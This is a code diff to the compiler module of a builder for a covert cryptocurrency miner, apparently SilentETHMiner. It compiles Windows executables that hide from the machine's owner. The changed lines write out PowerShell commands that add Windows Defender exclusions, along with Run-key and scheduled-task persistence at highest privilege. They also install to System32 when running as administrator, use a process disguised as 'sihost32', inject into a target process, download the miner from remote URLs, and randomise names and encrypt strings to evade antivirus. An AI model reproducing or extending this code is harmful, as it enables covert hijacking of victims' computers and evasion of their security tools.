@@ -9,6 +9,8 @@ Public Class Codedom
     Public Shared LoaderOK As Boolean = False
     Public Shared UninstallerOK As Boolean = False
     Public Shared F As Form1
+
+    Public Shared GlobalRProgram As String
     Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String)
         MinerOK = False
 
@@ -16,7 +18,9 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:library /platform:x64 /optimize "
+        Dim OP As String = " /target:winexe /platform:x64 /optimize "
+
+        GlobalRProgram = F.Randomi(F.rand.Next(5, 40))
 
         With Parameters
             .GenerateExecutable = False
@@ -35,7 +39,6 @@ Public Class Codedom
             F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
-                R.AddResource(F.Resources_dll, F.AES_Encryptor(My.Resources.Mandark))
                 If Not F.FA.toggleDownloader.Checked Then
                     R.AddResource(F.Resources_eth, F.AES_Encryptor(My.Resources.ethminer))
                 End If
@@ -45,8 +48,10 @@ Public Class Codedom
                 R.Generate()
             End Using
 
-            F.txtLog.Text = F.txtLog.Text + ("Embedding resources..." + vbNewLine)
-            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Res + ".Resources")
+            If Not F.FA.toggleDownloader.Checked Or (F.chkInstall.Checked And F.toggleWatchdog.Checked) Then
+                F.txtLog.Text = F.txtLog.Text + ("Embedding resources..." + vbNewLine)
+                .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Res + ".Resources")
+            End If
 
             Dim minerbuilder As New StringBuilder(Code)
 
@@ -74,7 +79,9 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:library /platform:x64 /optimize "
+        Dim OP As String = " /target:winexe /platform:x64 /optimize "
+
+        GlobalRProgram = F.Randomi(F.rand.Next(5, 40))
 
         With Parameters
             .GenerateExecutable = False
@@ -133,7 +140,6 @@ Public Class Codedom
             .CompilerOptions = OP
             .IncludeDebugInformation = False
             .ReferencedAssemblies.Add("System.dll")
-            .ReferencedAssemblies.Add("System.Core.dll")
             If F.FA.toggleEnableDebug.Checked Then
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             End If
@@ -145,7 +151,7 @@ Public Class Codedom
             Dim Resources_Loader = F.Randomi(rand.Next(5, 40))
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")
-                R.AddResource(Resources_Program, ProgramBytes.Reverse().ToArray())
+                R.AddResource(Resources_Program, F.AES_Encryptor(ProgramBytes))
                 R.Generate()
             End Using
 
@@ -197,7 +203,6 @@ Public Class Codedom
             .CompilerOptions = OP
             .IncludeDebugInformation = False
             .ReferencedAssemblies.Add("System.dll")
-            .ReferencedAssemblies.Add("System.Core.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
             If F.FA.toggleEnableDebug.Checked Then
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
@@ -228,7 +233,7 @@ Public Class Codedom
     Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
         If F.FA.toggleKillWD.Checked Then
             stringb.Replace("DefKillWD", "true")
-            stringb.Replace("#KillWDCommands", Convert.ToBase64String(Encoding.ASCII.GetBytes("powershell -Command Add-MpPreference -ExclusionPath '%cd%' & powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & exit").Reverse().ToArray()))
+            stringb.Replace("#KillWDCommands", F.EncryptString("/c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit"))
         End If
 
         If F.FA.toggleEnableDebug.Checked Then
@@ -255,7 +260,13 @@ Public Class Codedom
                     installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
             End Select
 
-            stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & "," & Chr(34) & F.txtInstallFileName.Text & Chr(34) & ")")
+            If True Then 'F.FA.toggleInstallSystem32.Checked Then
+                stringb.Replace("DefSystem32", "true")
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & ")," & Chr(34) & F.txtInstallFileName.Text & Chr(34) & ")")
+            Else
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & "," & Chr(34) & F.txtInstallFileName.Text & Chr(34) & ")")
+            End If
+
 
             If F.toggleWatchdog.Checked Then
                 stringb.Replace("DefWatchdog", "true")
@@ -279,17 +290,16 @@ Public Class Codedom
 
         stringb.Replace("%Guid%", Guid.NewGuid.ToString)
 
-        stringb.Replace("#STARTDELAY", F.txtStartDelay.Text)
         stringb.Replace("#KEY", F.AESKEY)
         stringb.Replace("#SALT", F.SALT)
         stringb.Replace("#IV", F.IV)
-        stringb.Replace("#DLLSTR", F.EncryptString("Mandark.Mandark"))
-        stringb.Replace("#DLLOAD", F.EncryptString("Load"))
         stringb.Replace("#REGKEY", F.EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
+        stringb.Replace("#SANCTAMMINERURL", F.EncryptString("https://sanctam.net:58899/assets/txt/resource_url.php?type=ethminer"))
         stringb.Replace("#MINERURL", F.EncryptString("https://github.com/UnamSanctam/SilentETHMiner/raw/master/SilentETHMiner/Resources/ethminer.zip"))
         stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Telemetry\"))
         stringb.Replace("#WATCHDOG", F.EncryptString("sihost32"))
         stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn "))
+        stringb.Replace("#MINERID", F.EncryptString("--cinit-find-e"))
         stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
         stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
 
@@ -300,18 +310,30 @@ Public Class Codedom
         stringb.Replace("RBaseFolder", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RCheckProc", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RInitialize", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RGetGPU", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RAES_Method", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RTruncate", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RCommandLineEncrypt", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RWDLoop", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("RStart", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("RLoader", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("RUninstaller", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("RProgram", GlobalRProgram)
 
         stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rarg3", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rlB", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg4", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg5", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg6", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg7", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg8", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg9", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg10", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rarg11", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rbD", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rbD2", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rplp", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("reT", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rxM", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("startDelay", F.txtStartDelay.Text)
     End Sub
 End Class
